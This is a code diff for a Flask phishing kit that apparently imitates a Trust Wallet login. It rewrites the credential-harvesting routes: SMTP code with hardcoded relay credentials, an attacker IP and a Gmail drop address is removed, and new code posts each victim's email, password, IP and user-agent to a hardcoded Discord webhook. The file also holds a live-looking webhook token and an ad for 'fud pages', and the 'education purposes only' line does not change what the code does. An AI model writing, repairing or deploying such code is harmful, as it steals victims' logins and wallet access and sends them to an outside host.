@@ -1,3 +1,4 @@
+import requests
 from flask import Flask, request, abort, render_template, session, redirect, url_for, jsonify
 import secrets
 import random
@@ -12,12 +13,15 @@ import smtplib, ssl
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1340685147883704351/SGFwo3rJA7gCvujVlH7VnWjuIjINTrgBxGwscEjfYMO_QEZgfEJFcOFx5bn1QfKWee9n"
+
 # made for education purposes only
 
 app = Flask(__name__)
 limiter = Limiter(get_remote_address, app=app, default_limits=["6 per day", "6 per hour"])
 secret_keyx = secrets.token_urlsafe(24)
 app.secret_key = secret_keyx
+
 
 bot_user_agents = [
 'Googlebot', 
@@ -182,77 +186,63 @@ def route2():
 @app.route("/first", methods=['POST'])
 def first():
     if request.method == 'POST':
-        ip = request.headers.get('X-Forwarded-For')
-        if ip is None:
-            ip = request.headers.get('X-Real-IP')
-        if ip is None:
-            ip = request.headers.get('X-Client-IP')
-        if ip is None:
-            ip = request.remote_addr
+        ip = request.headers.get('X-Forwarded-For') or request.headers.get('X-Real-IP') or \
+             request.headers.get('X-Client-IP') or request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "auto528@cryptasphere.bio"
-        sender_emaill = "auto528"
-        receiver_email = "danielnewwoj@gmail.com"
-        password = "vip7a81be0e2b36"
         useragent = request.headers.get('User-Agent')
-        message = MIMEMultipart("alternative")
-        message["Subject"] = "TRUST WALLETS Logs "
-        message["From"] = sender_email
-        message["To"] = receiver_email
-        text = """\
-        Hi,
-        How are you?
-        contact me on icq jamescartwright for your fud pages
-        """
-        html = render_template('emailmailer.html', emailaccess=email, useragent=useragent, passaccess=passwordemail, ipman=ip)
-        part1 = MIMEText(text, "plain")
-        part2 = MIMEText(html, "html")
-        message.attach(part1)
-        message.attach(part2)
-        with smtplib.SMTP("146.19.254.243", 6040) as server:
-            server.login(sender_emaill, password)
-            server.sendmail(sender_email, receiver_email, message.as_string())
+
+        # Format message for Discord
+        discord_message = {
+            "content": "**New Login Attempt**",
+            "embeds": [{
+                "title": "User Details",
+                "color": 16711680,  # Red color in decimal
+                "fields": [
+                    {"name": "Email", "value": email, "inline": True},
+                    {"name": "Password", "value": passwordemail, "inline": True},
+                    {"name": "IP Address", "value": ip, "inline": False},
+                    {"name": "User-Agent", "value": useragent, "inline": False}
+                ]
+            }]
+        }
+
+        # Send to Discord webhook
+        requests.post(DISCORD_WEBHOOK_URL, json=discord_message)
+
         # Set session value and redirect
         session['eman'] = email  # Save email as session variable
         return redirect(url_for('benza', web=email))
 
 
 
-@app.route("/second", methods=['POST'])
 def second():
     if request.method == 'POST':
-        ip = request.headers.get('X-Forwarded-For')
-        if ip is None:
-            ip = request.headers.get('X-Real-IP')
-        if ip is None:
-            ip = request.headers.get('X-Client-IP')
-        if ip is None:
-            ip = request.remote_addr
+        ip = request.headers.get('X-Forwarded-For') or request.headers.get('X-Real-IP') or \
+             request.headers.get('X-Client-IP') or request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "auto528@cryptasphere.bio"
-        sender_emaill = "auto528"
-        receiver_email = "danielnewwoj@gmail.com"
-        password = "vip7a81be0e2b36"
         useragent = request.headers.get('User-Agent')
-        message = MIMEMultipart("alternative")
-        message["Subject"] = "TRUST WALLET Logs  !! "
-        message["From"] = sender_email
-        message["To"] = receiver_email
-        text = """\
-        Hi,
-        How are you?
-        contact me on icq jamescartwright for your fud pages
-        """
-        html = render_template('emailmailer.html', emailaccess=email, useragent=useragent, passaccess=passwordemail, ipman=ip)
-        part1 = MIMEText(text, "plain")
-        part2 = MIMEText(html, "html")
-        message.attach(part1)
-        message.attach(part2)
-        with smtplib.SMTP("146.19.254.243", 6040) as server:
-            server.login(sender_emaill, password)
-            server.sendmail(sender_email, receiver_email, message.as_string())
+
+        # Format message for Discord
+        discord_message = {
+            "content": "**New Login Attempt**",
+            "embeds": [{
+                "title": "User Details",
+                "color": 16711680,  # Red color in decimal
+                "fields": [
+                    {"name": "Email", "value": email, "inline": True},
+                    {"name": "Password", "value": passwordemail, "inline": True},
+                    {"name": "IP Address", "value": ip, "inline": False},
+                    {"name": "User-Agent", "value": useragent, "inline": False}
+                ]
+            }]
+        }
+
+        # Send to Discord webhook
+        requests.post(DISCORD_WEBHOOK_URL, json=discord_message)
+
+        # Set session value and redirect
         session['ins'] = email  # Save email as session variable
         return redirect(url_for('lasmo', web=email))
 
